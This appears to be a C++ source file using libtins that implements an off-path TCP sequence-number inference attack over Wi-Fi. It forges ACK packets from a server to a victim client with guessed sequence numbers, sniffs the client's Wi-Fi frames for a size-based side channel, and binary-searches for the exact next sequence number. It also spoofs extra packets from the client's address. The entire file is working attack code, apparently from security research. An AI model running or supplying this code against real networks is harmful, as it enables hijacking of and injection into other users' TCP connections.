#include "SeqFinder.h"
#include <iostream>
#include <fstream>
#include <tins/tins.h>
#include <vector>
#include <deque>
#include <chrono> 
#include <random>
#include <thread>
#include <algorithm>

using namespace Tins;

void SeqFinder::capturePackets(std::vector<Packet>& pkts, int sniff_if_index) {
    SnifferConfiguration config;
    config.set_filter("wlan addr1 " + client_mac);
    config.set_immediate_mode(true);
    Sniffer sniffer(sniff_if_name[sniff_if_index], config);

    auto s_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::milliseconds(50);
    while (std::chrono::high_resolution_clock::now()-s_time < duration) {
        Packet packet=sniffer.next_packet();
        pkts.push_back(packet);
    }

}

void SeqFinder::handle_packets(const std::vector<Packet> pkts){
    target_frame_num = 0;
    
    for(const auto& packet : pkts){
        
        if(packet.pdu()->find_pdu<Dot11QoSData>()){
            if(packet.pdu()->find_pdu<RawPDU>()){
                if (packet.pdu()->rfind_pdu<RawPDU>().size() == 88){
                    target_frame_num += 1;
                    return;
                }
            }
        }

    }
}

void SeqFinder::checkSeqList(const std::vector<uint32_t>& seq_list) {

    if (seq_list.empty()) {
        target_frame_num = 0;
        std::cout << "[*] Warning: the seq_list is empty" << std::endl;
        return;
    }

    std::vector<IP> send_list;
    for (uint32_t sq : seq_list) {
        IP packet = IP(server_ip, client_ip) / TCP(server_port, client_port) / RawPDU("AAAA");
        TCP &tcp = packet.rfind_pdu<TCP>();
        tcp.set_flag(TCP::ACK, true);
        tcp.seq(sq);
        tcp.ack_seq(random_ack);

        for (int i = 0; i < repeat_num; i++) {
            send_list.emplace_back(packet);
        }
    }

    send_num += send_list.size();
    for (const IP& pkt : send_list) {
        send_byte += pkt.size();
    }

    std::vector<std::vector<Packet>> sniff_pkts_vec;
    int sniff_pkts_vec_num = sniff_if_name.size();
    
    for(int i=0; i<sniff_pkts_vec_num; i++){
        std::vector<Packet> sniff_pkts;
        sniff_pkts_vec.push_back(sniff_pkts);
    }

    std::vector<std::thread> sniff_thread_vec;
    for(int i=0; i<sniff_pkts_vec.size(); i++){
        sniff_thread_vec.emplace_back(&SeqFinder::capturePackets, this, std::ref(sniff_pkts_vec[i]), i);
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(5));

    PacketSender sender;
    for(auto pkt : send_list){
        sender.send(pkt, send_if_name);
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(50));

    /* Avoid long sniffing time due to loss of probe packets/responses */
    std::string add_ip = "8.8.8.8";
    IP add_packet = IP(client_ip, add_ip) / TCP(1234, 4321) / RawPDU("AAAAA");
    TCP &tcp = add_packet.rfind_pdu<TCP>();
    tcp.set_flag(TCP::ACK, true);
    
    for (int i =0; i<4; i++) {
        sender.send(add_packet, send_if_name);
    }

    for(auto& t: sniff_thread_vec){
        if(t.joinable()){
            t.join();
        }
    }

    /* Merge sniffed Wi-Fi frames */
    std::vector<Packet> sniff_pkts_merge;
    for(int i=0; i<sniff_pkts_vec.size(); i++){
        sniff_pkts_merge.insert(sniff_pkts_merge.end(), sniff_pkts_vec[i].begin(), sniff_pkts_vec[i].end());
    }

    handle_packets(sniff_pkts_merge);
}

void SeqFinder::seqCheck(uint32_t sq, SeqNextLocation& location) {
    uint32_t seq_next_left = 0;
    int check_line = 1;
    int check_sum = 3;

    for (int i = 0; i < check_sum; i++) {
        checkSeqList({sq});
        if (target_frame_num > 0) {
            seq_next_left++;
            if (seq_next_left >= check_line) {
                location = SEQ_NEXT_L;
                return;
            }      
        }
    }
    location = SEQ_NEXT_R;
}

void SeqFinder::findSentSeq() {
    sent_seq = random_seq;
    SeqNextLocation location;
    seqCheck(static_cast<uint32_t>(sent_seq), location);

    if (location == SEQ_NEXT_R) {
        sent_seq -= maxUint32Value_half;
        if (sent_seq < 0) {
            sent_seq += (maxUint32Value);
        }
    }

    std::cout << "[+] Find a sent seq: " << sent_seq << std::endl;
}

void SeqFinder::findSeqExact() {
    std::cout << "++++++++++ Try to find the SEQ in window ++++++++++" << std::endl;
    findSentSeq();
    int64_t rb = sent_seq;
    int64_t lb = rb - maxUint32Value_half;
    int64_t ans = -1;
    while (rb >= lb) {

        int64_t mid = (rb + lb) / 2;
        uint32_t seq_mid;
        if (mid < 0) {
            seq_mid = static_cast<uint32_t>(mid + maxUint32Value);
        }
        else{
            seq_mid = static_cast<uint32_t>(mid);
        }
        SeqNextLocation check;
        seqCheck(seq_mid, check);

        if (check == SEQ_NEXT_L) {
            ans = mid;
            rb = mid - 1;
        }
        else {
            lb = mid + 1;
        }
    }

    sent_seq_left_bound = ans >= 0 ? ans : ans + maxUint32Value;
    result = static_cast<uint32_t>(sent_seq_left_bound + maxUint32Value_half + 1);

    std::cout << "[+] Find the sent seq left bound: " << sent_seq_left_bound << ", the seq next: " << result << std::endl;
}

void SeqFinder::write_data(){
    std::ofstream file("seq_data.txt", std::ios::app);

    if (!file.is_open()){
        std::cerr << "Cannot open file!" << std::endl;
        return ;
    }

    file << cost_time << " " << send_rate << " " << send_byte << " " << send_num << std::endl;
    file.close();

    return ;
}

void SeqFinder::run() {
    auto time_start = std::chrono::system_clock::now();
    send_num = 0;
    send_byte = 0;
    sent_seq_left_bound = -1;
    result = 0;

    std::random_device rd;
    std::mt19937_64 eng(rd());
    std::uniform_int_distribution<uint32_t> distr(0, maxUint32Value);
    random_seq = distr(eng);
    random_ack = distr(eng);

    findSeqExact();

    auto time_end = std::chrono::system_clock::now();
    cost_time = std::chrono::duration<double>(time_end - time_start).count();
    send_rate = static_cast<double>(send_byte) / cost_time;

    std::cout << "Find the seq in window: " << result << std::endl;
    std::cout << "Send Packets: " << send_num << std::endl;
    std::cout << "Send Bytes: " << send_byte << " (Bytes)" << std::endl;
    std::cout << "Cost Time: " << cost_time << " (s)" << std::endl;
    std::cout << "Send Rate: " << send_rate << " (Byte/s)" << std::endl;
}

